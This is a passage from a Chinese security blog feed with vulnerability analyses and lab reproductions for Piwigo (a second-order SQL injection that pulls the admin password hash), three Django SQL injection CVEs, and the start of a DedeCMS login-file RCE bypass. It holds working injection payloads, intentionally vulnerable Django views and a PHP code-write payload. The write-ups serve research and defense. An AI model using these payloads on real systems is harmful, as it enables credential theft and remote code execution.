src="image-20221117220555569.png" alt="image-20221117220555569"></p><p>这里并没有 <code>order</code> 参数，我们添加进去即可，之后发包可见报错</p><p><img src="image-20221117220751998.png" alt="image-20221117220751998"></p><p>仅验证，点到即止</p><h2 id="0x03-CVE-2022-32297"><a href="#0x03-CVE-2022-32297" class="headerlink" title="0x03 CVE-2022-32297"></a>0x03 CVE-2022-32297</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>Piwigo</code> 在 12.2.0 版本的搜索功能中存在一个二次<code>SQL</code> 注入漏洞，该漏洞可以从前台获取数据库中的数据。</p><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="数据插入部分分析"><a href="#数据插入部分分析" class="headerlink" title="数据插入部分分析"></a>数据插入部分分析</h4><p>我们先来到前台搜索处，随意搜索，然后抓包查看，这里游客身份进入即可</p><p>通过抓包，我们可以抓到处理搜索功能的文件为 <code>qsearch.php</code> ，进入后直接下断点</p><p><img src="image-20221117233046830.png" alt="image-20221117233046830"></p><p>顺利进入该文件，跟进代码，看之后经历的操作，根据网上的信息，该漏洞为二次注入漏洞，因此可以格外关注 <code>insert into</code> 的数据库操作。</p><p>从上面的图中可以看到搜索的参数为 <code>q</code> ，而在代码中也有体现</p><p><img src="image-20221117233335010.png" alt="image-20221117233335010"></p><p>这里实际上就是根据搜索的 <code>q</code> 得到 <code>search</code> 数组，序列化数组并用 <code>addslashes</code> 处理后查找，存在该搜索就更新，不存在就插入，成功插入后返回搜索的 <code>id</code> ，这里序列化操作后 <code>addslashes</code> 处理了，因此不存在直接的注入漏洞。</p><p>这里先简单说一下，其余的部分在后面写出来</p><h4 id="管理员操作部分"><a href="#管理员操作部分" class="headerlink" title="管理员操作部分"></a>管理员操作部分</h4><p>插入值后，寻找该值被使用的位置，直接可以搜索 <code>SEARCH_TABLE</code> </p><p><img src="image-20221117233902452.png" alt="image-20221117233902452"></p><p>调用的位置不多，可以一个个看，主要关注取值的位置，来到 <code>admin/history.php</code> ，根据取值的位置找到如下代码</p><p><img src="image-20221117234121204.png" alt="image-20221117234121204"></p><p>当存在<code>get</code> 的参数中存在 <code>search_id</code> 时，就会根据 <code>search_id</code> 查找 <code>rules</code> ，从上一部分的分析来看，这个 <code>rules</code> 是被序列化后的查询数据，我们也可以通过直接去看数据库内容看出来</p><p><img src="image-20221118231419112.png" alt="image-20221118231419112"></p><p>取出来的值直接反序列化，得到 <code>$page[&#39;search&#39;]</code> ，当 <code>get</code> 的参数中还存在 <code>user_id</code> 时，则会将 <code>$page[&#39;search&#39;]</code> 序列化后再次插入数据库中，但是这里的序列化数据并没有进行处理，也就是说数据里面存在单引号等就可以直接闭合，刚好这里的数据是我们可以利用第一部分的搜索操作控制的，因此造成了一个二次注入。</p><p>这里的构造需要很巧妙，既要闭合 <code>SQL</code> 操作，又要通过序列化操作，不得不说这个漏洞发现者很强，在此之前我是想不到还可以这样玩的。</p><p>这里简单说一下构造，因为 <code>insert</code> 是支持一次性插入多条数据的，通过逗号隔开即可，我们第一步的搜索语句中，插入时存在 <code>addslashes</code> ，因此插进去时是什么样子，拿出来也会是什么样子，这里一部分先闭合，随意给一个值即可，比如给一个 <code>test&#39;</code> ，此处 <code>insert</code> 只有一个字段，因此必须先闭合括号，然后开启插入的第二个数据，写一下大概就是如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">test</span><span class="hljs-string">&#x27;),</span><br></code></pre></td></tr></table></figure><p>由于这个字段的数据都是序列化后的，因此我们必须满足序列化的规则才方便被正常取出，我们先构造一个获取管理员密码的语句如下：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">FROM</span> piwigo_users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>使用这条语句获取到密码后，再将其放入模板中</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;q&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;xxxx&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><code>xxxx</code> 就是我们获取到的密文，前面的4跟随密文长度变化，我看了下，这里加密方式产出的密文好像都是 34 位，因此这里直接设 34。</p><p>密码获取需要通过上面的语句获取，使用 <code>concat</code> 拼接获取，配合前面的内容得到</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">test&#x27;),((<span class="hljs-keyword">select</span> concat(<span class="hljs-string">&#x27;a:1:&#123;s:1:&quot;q&quot;;s:34:&quot;&#x27;</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">FROM</span> piwigo_users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;&quot;;&#125;&#x27;</span>)))#<br></code></pre></td></tr></table></figure><p>构造如上 <code>payload</code> ，通过前台搜索功能插入后，在这里就可以获取到密文，并将密文存储到数据库中</p><h4 id="访问前台获取密码"><a href="#访问前台获取密码" class="headerlink" title="访问前台获取密码"></a>访问前台获取密码</h4><p>接下来是获取该数据库内容，因此涉及的数据库仍然是刚刚的数据库，可以继续搜索 <code>SEARCH_TABLE</code> ，找到一处前台获取该数据库内容的位置，位于 <code>include/functions_search.inc.php</code></p><p><img src="image-20221121204114680.png" alt="image-20221121204114680"></p><p>这里是一个函数，直接根据 <code>$search_id</code> 搜索，然后反序列化 <code>rules</code> 后返回，我们看看调用位置</p><p><img src="image-20221121204231387.png" alt="image-20221121204231387"></p><p>定位到 <code>search_rules.php</code> </p><p><img src="image-20221121204308272.png" alt="image-20221121204308272"></p><p>比较简单就知道可以成功获取。</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="将payload通过前台插入数据库"><a href="#将payload通过前台插入数据库" class="headerlink" title="将payload通过前台插入数据库"></a>将payload通过前台插入数据库</h4><p>按照之前说的注入</p><p><img src="image-20221121204807619.png" alt="image-20221121204807619"></p><p>记录返回的 <code>id</code> 值，对应插入记录的 <code>id</code></p><p>但是发现之后的利用会出错，这是为什么呢？按照前面说的，这里的 <code>q</code> 写入的是什么，之后获取就应该是那个值，但是 <code>$_GET</code> 在利用前实际上会被处理一次，位于 <code>include/common.inc.php</code> ，这是文件开头就会调用的</p><p><img src="image-20221121215142137.png" alt="image-20221121215142137"></p><p>因此我们这里写入的 <code>payload</code> 中的单引号会被加上 <code>\</code> ，就像上面图中的数据库 一样</p><p>这里的解决方法是将参数 <code>q</code> 作为一个数组写入，数组的键为 <code>payload</code> ，而 之后的处理由于是序列化，因此这个键也会被写入，之后取出来也适用。</p><p><img src="image-20221121215634944.png" alt="image-20221121215634944"></p><p>如此，进入数据库的值就不会被转义了</p><h4 id="管理员用户点击该漏洞链接"><a href="#管理员用户点击该漏洞链接" class="headerlink" title="管理员用户点击该漏洞链接"></a>管理员用户点击该漏洞链接</h4><p>此操作需要管理员权限</p><p><img src="image-20221121215728409.png" alt="image-20221121215728409"></p><p>可以看到，执行完后，会在数据库中生成两条记录，其中一条就获取到了密文</p><h4 id="攻击者前台访问获取密码"><a href="#攻击者前台访问获取密码" class="headerlink" title="攻击者前台访问获取密码"></a>攻击者前台访问获取密码</h4><p>这里唯一需要注意的一点是我们需要知道 <code>search_id</code> ，也就是插入的那条含有密文的数据的 <code>id</code> 值</p><p><img src="image-20221121220108758.png" alt="image-20221121220108758"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>相对来说，<code>CVE-2022-32297</code> 会更有意思，而且该漏洞比较难以发现，虽然需要管理员用户点击，但用户可以从前台获取到数据，比 <code>CVE-2022-26266</code> 的危害更加大。这个漏洞让我想起了 <code>Laravel</code> <code>CVE-2021-3129</code> 漏洞，同样是取出来后又放进去，从而导致了漏洞，虽然造成漏洞的本质并不一样，但有着异曲同工之妙。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文首发于奇安信攻防社区：&lt;a href=&quot;https://forum.butian.net/share/2030&quot;&gt;https://forum.butian.net/share/2030&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景</summary>
      
    
    
    
    <category term="PHP漏洞复现" scheme="https://d5shenwu.github.io/categories/PHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="PHP" scheme="https://d5shenwu.github.io/tags/PHP/"/>
    
    <category term="CVE" scheme="https://d5shenwu.github.io/tags/CVE/"/>
    
    <category term="Piwigo" scheme="https://d5shenwu.github.io/tags/Piwigo/"/>
    
    <category term="SQL注入漏洞" scheme="https://d5shenwu.github.io/tags/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>细数Django框架核心历史SQL注入漏洞（下）</title>
    <link href="https://d5shenwu.github.io/2022/10/15/%E7%BB%86%E6%95%B0Django%E6%A1%86%E6%9E%B6%E6%A0%B8%E5%BF%83%E5%8E%86%E5%8F%B2SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <id>https://d5shenwu.github.io/2022/10/15/%E7%BB%86%E6%95%B0Django%E6%A1%86%E6%9E%B6%E6%A0%B8%E5%BF%83%E5%8E%86%E5%8F%B2SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%8B%EF%BC%89/</id>
    <published>2022-10-15T14:24:53.000Z</published>
    <updated>2022-11-04T14:33:27.560Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于奇安信攻防社区：<a href="https://forum.butian.net/share/1962">https://forum.butian.net/share/1962</a></p><p>本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。</p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近总结了一下 <code>Django</code> 框架曾经出现的 <code>SQL</code> 注入漏洞，总共有七个 <code>CVE</code> ，分别都简单分析复现并写了文章，总体来说会觉得比较有意思，在这里分享一下。本篇文章是下篇。上篇请查看：<a href="https://forum.butian.net/share/1923">细数Django框架核心历史SQL注入漏洞（上）</a></p><h2 id="0x01-目录"><a href="#0x01-目录" class="headerlink" title="0x01 目录"></a>0x01 目录</h2><p>本篇文章分享三个 <code>CVE</code> ，其他四个 <code>CVE</code> 在上篇文章展现。</p><ul><li>CVE-2022-28346</li><li>CVE-2022-28347</li><li>CVE-2022-34265</li></ul><h2 id="0x02-CVE-2022-28346"><a href="#0x02-CVE-2022-28346" class="headerlink" title="0x02 CVE-2022-28346"></a>0x02 CVE-2022-28346</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>Django</code> 在2022年发布的安全更新，修复了在 <code>QuerySet</code> 的 <code>annotate()</code>， <code>aggregate()</code>， <code>extra() </code>  等函数中存在的 <code>SQL</code> 注入漏洞。</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><ul><li>Django 2.2.x &lt; 2.2.28</li><li>Django 3.2.x &lt; 3.2.13</li><li>Django 4.0.x &lt; 4.0.4</li></ul><p>需要使用了 <code>annotate</code>  或者 <code>aggregate</code> 或 <code>extra</code> 方法</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们可以直接来到 <code>github</code> 修复记录</p><p><img src="20220923100805.png" alt="1"></p><p>这里给 <code>add_annotation</code> 和 <code>add_extra</code> 两个函数中的参数添加了正则过滤，接下来我们就是要找到哪里使用到了这两个函数</p><p>这里其实可以通过测试用例来进行判断，我们可以看到修复记录中也存在测试用例的修复有点多，这里只选取一个进行分析</p><p><img src="20220923101337.png" alt="2"></p><p>这里使用到了如下语句</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Author<span class="hljs-selector-class">.objects</span><span class="hljs-selector-class">.aggregate</span>(**&#123;crafted_alias: <span class="hljs-built_in">Avg</span>(<span class="hljs-string">&quot;age&quot;</span>)&#125;)<br></code></pre></td></tr></table></figure><p><code>crafted_alias</code> 是用来测试的 <code>payload</code> ，我们先找到 <code>aggregate</code> 的实现位置</p><p>最终可以找到这里 <code>django\db\models\query.py</code></p><p><img src="20220923101814.png" alt="3"></p><p>传进来的 <code>args</code> 与 <code>kwargs</code>会经过 <code>_validate_values_are_expressions</code> 处理，但没有进行过滤</p><p>之后进过 <code>add_annotation</code> 进行赋值，如下</p><p><img src="20220923102244.png" alt="4"></p><p>这里就是修复 <code>sql</code> 注入的位置，对 <code>alias</code> 进行了过滤，而目前这里没有进行过滤，直接成为了 <code>self.annotations</code> 的键，之后跟进会发现这个<code>self.annotations</code> 在 <code>resolve_ref</code> 函数中被取出来</p><p><img src="20220923103209.png" alt="5"></p><p>这里会将我们之前的 <code>alias</code> 的值最终放到 <code>transform</code> 中，直接被使用</p><p>其他的漏洞函数与这个类似，就不分析了。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>复现环境参考之前的 <code>CVE-2020-7471</code> ，只需要更改 <code>views.py</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> django.shortcuts <span class="hljs-keyword">import</span> render, HttpResponse<br><span class="hljs-keyword">from</span> .models <span class="hljs-keyword">import</span> Collection<br><span class="hljs-keyword">from</span> django.contrib.postgres.aggregates.general <span class="hljs-keyword">import</span> StringAgg<br><span class="hljs-keyword">from</span> django.db.models <span class="hljs-keyword">import</span> Count<br><br># <span class="hljs-keyword">Create</span> your views here.<br><br>def vuln(request):<br>    query = request.<span class="hljs-keyword">GET</span>.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;q&#x27;</span>)<br>    qs = Collection.objects.annotate(**&#123;query:Count(&quot;name&quot;)&#125;)<br>    <span class="hljs-keyword">return</span> HttpResponse(qs)<br><br></code></pre></td></tr></table></figure><p><code>payload</code> 如下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8000</span><span class="hljs-regexp">/vuln/</span>?q=aaaaa%<span class="hljs-number">22</span><br></code></pre></td></tr></table></figure><p><img src="20220923105043.png" alt="6"></p><h2 id="0x03-CVE-2022-28347"><a href="#0x03-CVE-2022-28347" class="headerlink" title="0x03 CVE-2022-28347"></a>0x03 CVE-2022-28347</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>Django</code> 在2022年发布的安全更新，修复了在 <code>QuerySet</code> 的 <code>explain()</code>函数中存在的 <code>SQL</code> 注入漏洞。</p><h3 id="漏洞影响-1"><a href="#漏洞影响-1" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><ul><li>Django 2.2.x &lt; 2.2.28</li><li>Django 3.2.x &lt; 3.2.13</li><li>Django 4.0.x &lt; 4.0.4</li></ul><p>需要使用了 <code>explain</code>  方法，并且参数可控</p><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们可以直接来到 <code>github</code> 修复记录</p><p><img src="20220923150326.png" alt="7"></p><p>这里首先做的就是对 <code>options</code> 的内容进行过滤，如果包含敏感的字符，那么就报错，仅仅这些还没够，还做了如下更改</p><p><img src="20220923150512.png" alt="8"></p><p>这里做了一个白名单，只有在这个白名单中的字符串才可以被使用，不会直接将所有的都拼接进去</p><p>有了修复的记录，我们就很容易定位到出现问题的地方，这里 <code>django\db\models\sql\compiler.py</code>  是将代码变成 <code>sql</code> 语句，在这里有一句关于 <code>explain</code> 的处理</p><p><img src="20220923150735.png" alt="1"></p><p><code>result</code> 是一个数组，里面的字符串最后都会拼接到一起，这里调用 <code>explain_query_prefix</code> 进行处理 <code>self.query.explain_options</code> 的内容，我们这里使用 <code>postgres</code> 数据库，并且 <code>postgres</code> 对这个函数存在重写，因此这里也直接看该数据库相关的处理</p><p><code>django\db\backends\postgresql\operations.py</code></p><p> <img src="20220923151019.png" alt="1"></p><p>经过父类的处理后，在下面，会将<code>options</code> 中的每一个取出来，键直接为键，值存在就为 <code>true</code> ，因此值无法被更改，但是键会直接写入，最后拼接到 <code>prefix</code> 上去，因此这里的键存在注入。</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>复现环境参考之前的 <code>CVE-2022-28346</code> ，只需要更改 <code>views.py</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> django.shortcuts <span class="hljs-keyword">import</span> render, HttpResponse<br><span class="hljs-keyword">from</span> .models <span class="hljs-keyword">import</span> Collection<br><span class="hljs-keyword">from</span> django.contrib.postgres.aggregates.general <span class="hljs-keyword">import</span> StringAgg<br><span class="hljs-keyword">from</span> django.db.models <span class="hljs-keyword">import</span> Count<br><br><span class="hljs-keyword">import</span> <span class="hljs-type">json</span><br># <span class="hljs-keyword">Create</span> your views here.<br><br>def vuln(request):<br>    query = request.<span class="hljs-keyword">GET</span>.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;q&#x27;</span>)<br>    query = <span class="hljs-type">json</span>.loads(query)<br>    qs = Collection.objects.<span class="hljs-keyword">filter</span>(<span class="hljs-type">name</span>=&quot;tom&quot;).<span class="hljs-keyword">explain</span>(**query)<br>    <span class="hljs-keyword">return</span> HttpResponse(qs)<br><br></code></pre></td></tr></table></figure><p><code>payload</code> 如下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8000</span>/vuln/?q=&#123;%<span class="hljs-number">22</span>ANALYZE%<span class="hljs-number">20</span>true)%<span class="hljs-number">22</span>:%<span class="hljs-number">22</span>aaa%<span class="hljs-number">22</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="20220923151815.png" alt="1"></p><h2 id="0x04-CVE-2022-34265"><a href="#0x04-CVE-2022-34265" class="headerlink" title="0x04 CVE-2022-34265"></a>0x04 CVE-2022-34265</h2><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>Django</code> 在2022年发布的安全更新，修复了在 <code>Trunc()</code> 和 <code>Extract()</code> 函数中存在的 <code>SQL</code> 注入漏洞。</p><h3 id="漏洞影响-2"><a href="#漏洞影响-2" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><ul><li>Django 3.2.x &lt; 3.2.14</li><li>Django 4.0.x &lt; 4.0.6</li></ul><p>需要使用了 <code>Trunc()</code> 或 <code>Extract()</code>  方法，并且参数可控</p><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们可以直接来到 <code>github</code> 修复记录</p><p><img src="20220923163054.png" alt="1"></p><p>在这里是直接给 <code>Extract</code> 类或者 <code>Trunc</code> 类的 <code>as_sql</code> 方法添加了一层正则过滤。</p><p>这里我们以 <code>Extract</code> 为例，可以多关注被过滤的那个参数，也就是 <code>self.lookup_name</code> </p><p><img src="20220923164046.png" alt="1"></p><p>这里我们可以进入多个分支，但之后得处理实际上都差不多，我们先进入 <code>datetime_extract_sql</code> </p><p><img src="20220923164231.png" alt="1"></p><p>这里还是进入了和上面一样的 <code>date_extract_sql</code> 函数，而且没有经历其他的处理</p><p><img src="20220923164335.png" alt="1"></p><p>看到 <code>lookup_type</code> ，就是我们之前传入的被过滤的参数，最后在 <code>else</code> 直接拼接了，直接造成 <code>sql</code> 注入。 </p><p><code>trunc</code> 也是一样，不过进入的是 <code>datetime_trunc_sql</code>  或者 <code>time_trunc_sql</code> 等函数</p><p><img src="20220923164652.png" alt="1"></p><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>漏洞复现可以参照修复记录中的 <code>test</code> ，这里直接使用 <code>vulhub</code> 的环境，可以直接在下面获取</p><p><code>payload</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8000</span>/?date=aaa%<span class="hljs-number">27</span><br></code></pre></td></tr></table></figure><p><img src="20220923202021.png" alt="1"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文首发于奇安信攻防社区：&lt;a href=&quot;https://forum.butian.net/share/1962&quot;&gt;https://forum.butian.net/share/1962&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景</summary>
      
    
    
    
    <category term="Python漏洞复现" scheme="https://d5shenwu.github.io/categories/Python%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="CVE" scheme="https://d5shenwu.github.io/tags/CVE/"/>
    
    <category term="SQL注入漏洞" scheme="https://d5shenwu.github.io/tags/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="漏洞复现" scheme="https://d5shenwu.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Python" scheme="https://d5shenwu.github.io/tags/Python/"/>
    
    <category term="Django" scheme="https://d5shenwu.github.io/tags/Django/"/>
    
  </entry>
  
  <entry>
    <title>DedeCMS_5.7.97_前台RCE_漏洞挖掘与分析</title>
    <link href="https://d5shenwu.github.io/2022/10/04/DedeCMS-5-7-97-%E5%89%8D%E5%8F%B0RCE-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90/"/>
    <id>https://d5shenwu.github.io/2022/10/04/DedeCMS-5-7-97-%E5%89%8D%E5%8F%B0RCE-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90/</id>
    <published>2022-10-04T14:37:46.000Z</published>
    <updated>2023-03-15T15:02:45.208Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于奇安信攻防社区：<a href="https://forum.butian.net/share/1940">https://forum.butian.net/share/1940</a></p><p>本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。</p><h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>本文分为两部分，第一部分是 <code>CVE-2022-35516</code> 的漏洞复现，影响到 <code>5.7.96</code> ，第二部分是该漏洞的一个绕过，影响 <code>5.7.97</code> ，已提交 <code>CNVD</code> ，<code>dedecms</code> 已在 <code>5.7.98</code> 修补。</p><p>大概在 <code>5.7.93</code> 版本左右，<code>dedecms</code> 新加了一个功能，用来记录用户登录次数，直接写入 <code>php</code> 文件，可以造成 <code>RCE</code>。就是此处的 <code>CVE-2022-35516</code></p><p><img src="20221004171247.png" alt="1"></p><h2 id="0x01-漏洞影响"><a href="#0x01-漏洞影响" class="headerlink" title="0x01 漏洞影响"></a>0x01 漏洞影响</h2><p><code>dedecms 5.7.93 &lt; x &lt; 5.7.97</code></p><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>环境获取：</p><p><a href="https://www.dedecms.com/download">https://www.dedecms.com/download</a></p><h3 id="CVE-2022-35516"><a href="#CVE-2022-35516" class="headerlink" title="CVE-2022-35516"></a>CVE-2022-35516</h3><p>在登陆界面，不会验证用户名真假，直接写入文件</p><p>代码有点长，不直接贴了，讲一下大概逻辑</p><ol><li>如果存在 <code>data/login.data.php</code> ，那么会包含该文件，获取里面的内容赋值给 <code>$arr_login</code>，这里是取出之前存储的登录次数等内容</li><li>比较验证码，不正确就退出</li><li>进行 <code>checkuser</code>，验证用户名密码是否正确，因为我们要实现前台 <code>RCE</code>，因此不考虑用户名密码正确的情况</li><li>用户名错误时，会将 <code>$arr_login</code> 在  <code>json_encode</code> 后写入文件，包括内容有用户名，次数，时间，其中我们能控制的就是用户名</li></ol><p>这里贴上关键代码</p><p><img src="image-20220801221819721.png" alt="1"></p><p>这里直接将 <code>php</code> 代码写入了 <code>data/login.data.php</code> ，但是 <code>dedecms</code> 会对进入程序的所有变量进行一次过滤，比如这里的 <code>$userid</code>，实际上就是 <code>post</code> 进来后注册成全局变量然后进行过滤的，具体代码位于 <code>include/common.inc.php</code></p><p><img src="image-20220801222556313.png" alt="1"></p><p>进入的 <code>userid</code> 会经过 <code>_RunMagicQuotes</code> 过滤，看代码</p><p><img src="image-20220801222703635.png" alt="1"></p><p>存在 <code>addslashes</code> 转义，因此我们传入的 <code>payload</code> 经过这里后是存在如下变化的</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#x27;;phpinfo();?&gt;  =&gt; \&#x27;;phpinfo();?&gt;<br></code></pre></td></tr></table></figure><p>按道理说这里是无法闭合上之前的单引号，<code>dedecms</code> 的开发者估计也是这么想的，因此导致了漏洞的产生</p><p>因为忽略了 <code>json_encode</code> 的转义，<code>json_encode</code> 会转义 <code>/\</code> 等字符，如下</p><p><img src="image-20220801223949896.png" alt="1"></p><p>因此，经过 <code>json_encode</code> 后的字符串会这样变化</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\&#x27;;phpinfo();?&gt;</span>  =&gt; <span class="hljs-string">\\&#x27;;phpinfo();?&gt;</span><br></code></pre></td></tr></table></figure><p>此处将转义符号给转义回去了，因此可以闭合之前的单引号，从而写入一句话木马</p><h3 id="修补绕过"><a href="#修补绕过" class="headerlink" title="修补绕过"></a>修补绕过</h3><p>在 <code>5.7.97</code> 中， <code>login.php</code> 的判断用户名密码返回值时，修改成了如下代码</p><p><img src="image-20220801224952830-16648691447791.png" alt="1"></p><p>原本是没有 <code>$res == -1</code> 这样的比较的，错误就直接将用户名写入文件，但此处添加了这个比较后，用户名错误时，就直接退出，不会再进入到写文件的那步。在低版本中，我们主要依靠用户名来写 <code>shell</code>，现在既要要求用户名存在，又需要用户名写 <code>shell</code>，真的做不到吗？答案是否定的，我们跳转到 <code>checkuser</code> 函数</p><p><code>include/userlogin.class.php</code></p><p><img src="image-20220801225038157-16648691447803.png" alt="1"></p><p>在上一节就讲过了，这些变量是直接 <code>post</code> 进来，之后转义过，而这里没有像之前的 <code>json_encode</code> 一样的再次转义的函数，因此 <code>$this-&gt;userName</code> 这里是不存在注入的，那我们就没法依靠注入来实现既能获取用户名，又实现写入 <code>shell</code> 的操作</p><p>令人有些希望的是上面的正则，他会将除了那一部分字符外的其他字符转换为空，那么我们是不是可以写一堆其他字符，让这里转换为空，而写入 <code>shell</code> 的地方还存在这些字符呢？试了挺久，没成功，包括使用取反，异或等无字母数字 <code>webshell</code> 的操作</p><p>这里写一下我绕过的方案（假设管理员中存在一个用户名为 <code>admin</code>，根据常用习惯以及 <code>dedecms</code> 设置中的默认，大概率会是存在这个的，实在不行就去其首页找一找，肯定会有管理员发布的东西，从而找到其用户名，只要是在管理员表即可）</p><p>使用这里的正则来绕过是必然的，但我们能使用的字符有限，需要满足能获取用户名，那么可以是 <code>adminADMIN</code> ，然后要满足位于正则过滤的列表，最后得到的字符是这些</p><figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs julia">adminADMIN&#x27;<span class="hljs-string">&quot;;?&gt;<span class="hljs-subst">$()</span></span><br></code></pre></td></tr></table></figure><p>有上面这些就差不多了，还有一些其他的字符没写</p><p>然后我们注意到 <code>dede/login.php</code> 中，存在一句代码</p><p><img src="image-20220801230244964-16648691447792.png" alt="1"></p><ol><li>存在 <code>data/login.data.php</code> 时，会先包含一次该文件，也就是说里面的内容会执行</li><li>上面我有提到，<code>dedecms</code> 会将所有 <code>post</code> 或者 